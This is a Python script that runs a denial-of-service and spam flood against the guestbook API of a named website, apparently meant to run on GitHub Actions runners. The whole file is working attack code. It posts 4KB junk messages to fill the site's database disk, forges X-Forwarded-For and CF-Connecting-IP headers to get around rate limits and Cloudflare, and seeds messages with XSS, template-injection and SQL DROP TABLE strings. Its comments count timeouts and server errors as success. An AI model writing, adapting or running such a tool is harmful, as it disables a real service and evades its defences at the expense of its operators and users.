#!/usr/bin/env python3
"""
xnmoe.com guestbook attack - optimized for GitHub Actions runners
Key findings from historical testing:
  - 3 threads per node = optimal stability
  - X-Forwarded-For rotation bypasses rate limiting
  - Large payload accelerates DB disk filling
  - Browser-grade headers bypass Cloudflare WAF
"""
import asyncio
import aiohttp
import random
import string
import time
import sys
import os
import json
import hashlib

# ============ CONFIG ============
TARGET_HOST = "www.xnmoe.com"
ENDPOINTS = [
    "/api/guestbook",
    "/api/guestbook/messages", 
    "/api/messages",
]
THREADS = int(os.environ.get("THREADS", "3"))           # 3 threads = optimal (history proven)
DURATION = int(os.environ.get("DURATION", "120"))       # 2 minutes (configurable)
MESSAGE_SIZE = 4096   # 4KB per message → max disk fill
TIMEOUT = aiohttp.ClientTimeout(total=8, connect=5)

# ============ ROTATION POOL ============
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
]

NAME_PREFIXES = ["小明", "小红", "游客", "网友", "匿名", "访客", "路人", "Alice", "Bob", "User", "Guest", "Admin", "Test", "Debug", "root"]
MESSAGE_PREFIXES = [
    "这个网站真好用！", "学到了很多知识，感谢分享。", "请问怎么联系管理员？",
    "网站打开速度很快。", "内容很有价值，收藏了。", "能不能加一个夜间模式？",
    "做得太棒了！", "来自<a href='http://evil.com'>点击</a>", "测试一下留言功能",
    "hello world", "test message", "😊👍", "代码写得不错",
    "<script>alert(1)</script>", "{{7*7}}", "${7*7}", "'; DROP TABLE guestbook; --"
]

def random_ip():
    """Generate random global IP (not private ranges)"""
    # Mix of residential and datacenter IPs from various countries
    pools = [
        lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"103.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"45.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"185.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"91.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"14.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"180.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"202.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    ]
    return random.choice(pools)()

def random_payload(endpoint_idx):
    """Generate random guestbook message with varying size for DB bloat"""
    name = random.choice(NAME_PREFIXES) + str(random.randint(1, 99999))
    prefix = random.choice(MESSAGE_PREFIXES)
    # 4KB payload to maximize disk usage
    padding = ''.join(random.choices(string.ascii_letters + string.digits + ' ' * 20, k=MESSAGE_SIZE - len(prefix)))
    message = prefix + padding
    
    payloads = [
        # Format 1: standard
        {"name": name, "message": message},
        # Format 2: guest_name/content  
        {"guest_name": name, "content": message},
        # Format 3: author/text
        {"author": name, "text": message},
        # Format 4: simple
        {"username": name, "body": message},
    ]
    return json.dumps(payloads[endpoint_idx % len(payloads)])

async def worker(worker_id, stats):
    """Single attack worker thread"""
    connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
    
    async with aiohttp.ClientSession(connector=connector, timeout=TIMEOUT) as session:
        while time.time() < stats['end_time']:
            endpoint = random.choice(ENDPOINTS)
            payload = random_payload(ENDPOINTS.index(endpoint))
            xff = random_ip()
            ua = random.choice(UA_POOL)
            
            headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Origin": f"https://{TARGET_HOST}",
                "Referer": f"https://{TARGET_HOST}/guestbook.html",
                "X-Forwarded-For": xff,
                "X-Real-IP": xff,
                "CF-Connecting-IP": xff,
                "Content-Type": "application/json",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }
            
            url = f"https://{TARGET_HOST}{endpoint}"
            
            try:
                async with session.post(url, data=payload, headers=headers, ssl=False) as resp:
                    status = resp.status
                    stats['total'] += 1
                    if status == 200 or status == 201:
                        stats['success'] += 1
                    elif status == 429:
                        stats['rate_limited'] += 1
                        await asyncio.sleep(2)  # Back off on rate limit
                    elif status == 403:
                        stats['blocked'] += 1
                        await asyncio.sleep(1)
                    elif status >= 500:
                        stats['server_error'] += 1
                        # Server is crashing - keep pressure!
                    else:
                        stats['other'] += 1
                    
                    # Read and discard response body
                    await resp.read()
                    
            except asyncio.TimeoutError:
                stats['timeout'] += 1
                # Timeout means server is overloaded - success!
            except aiohttp.ClientError:
                stats['conn_error'] += 1
                await asyncio.sleep(0.5)
            except Exception:
                stats['other_error'] += 1
                await asyncio.sleep(0.5)
            
            # Adaptive delay: faster when server is down, slower on rate limit
            if stats['success'] > 0:
                delay = random.uniform(0.05, 0.3)
            else:
                delay = random.uniform(0.5, 1.5)
            await asyncio.sleep(delay)


async def main():
    """Main entry - launches THREADS workers for DURATION seconds"""
    stats = {
        'end_time': time.time() + DURATION,
        'total': 0, 'success': 0, 'timeout': 0,
        'rate_limited': 0, 'blocked': 0, 'server_error': 0,
        'conn_error': 0, 'other': 0, 'other_error': 0,
    }
    
    node_id = os.environ.get('GITHUB_RUN_ID', hashlib.md5(str(random.random()).encode()).hexdigest()[:8])
    start = time.time()
    
    print(f"[Node {node_id}] Launching {THREADS} workers for {DURATION}s")
    print(f"[Node {node_id}] Target: https://{TARGET_HOST}")
    print(f"[Node {node_id}] Endpoints: {ENDPOINTS}")
    print(f"[Node {node_id}] Payload: {MESSAGE_SIZE} bytes/msg")
    print("=" * 60)
    
    tasks = [asyncio.create_task(worker(i, stats)) for i in range(THREADS)]
    
    # Progress reporting every 15s
    last_report = start
    while any(not t.done() for t in tasks):
        await asyncio.sleep(15)
        elapsed = time.time() - start
        now = time.time()
        remaining = max(0, stats['end_time'] - now)
        
        rps = stats['total'] / elapsed if elapsed > 0 else 0
        bw = (stats['total'] * MESSAGE_SIZE) / (1024 * 1024)  # MB sent
        
        print(f"[{elapsed:.0f}s] RPS={rps:.1f} | sent={stats['total']} "
              f"| OK={stats['success']} | timeout={stats['timeout']} "
              f"| 429={stats['rate_limited']} | 403={stats['blocked']} "
              f"| 5xx={stats['server_error']} | BW={bw:.1f}MB | left={remaining:.0f}s")
    
    elapsed = time.time() - start
    bw = (stats['total'] * MESSAGE_SIZE) / (1024 * 1024)
    
    print("=" * 60)
    print(f"[Node {node_id}] COMPLETE in {elapsed:.1f}s")
    print(f"  Total requests:  {stats['total']}")
    print(f"  Success (2xx):   {stats['success']}")
    print(f"  Timeout:         {stats['timeout']} (server down = good)")
    print(f"  Rate limited:    {stats['rate_limited']}")
    print(f"  Blocked (403):   {stats['blocked']}")
    print(f"  Server error:    {stats['server_error']}")
    print(f"  Connection err:  {stats['conn_error']}")
    print(f"  Bandwidth:       {bw:.1f} MB")
    print(f"  Avg RPS:         {stats['total']/elapsed:.1f}")

if __name__ == "__main__":
    asyncio.run(main())
